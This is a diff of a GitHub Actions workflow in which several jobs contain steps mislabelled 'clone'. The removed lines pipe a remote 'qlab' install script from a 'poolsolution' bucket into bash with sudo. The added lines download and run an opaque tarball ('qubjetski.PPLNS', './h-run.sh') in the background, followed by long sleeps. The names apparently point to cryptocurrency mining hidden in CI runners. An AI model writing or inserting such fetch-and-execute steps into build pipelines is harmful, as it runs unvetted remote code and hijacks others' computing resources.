@@ -25,8 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
-           systemctl enable qlab &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
            sleep 310s
   ol:
     needs: kont
@@ -49,8 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
-           systemctl enable qlab &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 5m
         
     
@@ -76,8 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
-           systemctl enable qlab &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 6m
   ayo:
     needs: ol
@@ -100,8 +97,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
-           systemctl enable qlab &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 105m
         
     
@@ -127,8 +123,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
-           systemctl enable qlab &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/komtol.tar.gz && tar xf komtol.tar.gz && cd qubjetski.PPLNS && chmod +x * && ./h-run.sh &
             sleep 61m
         
     
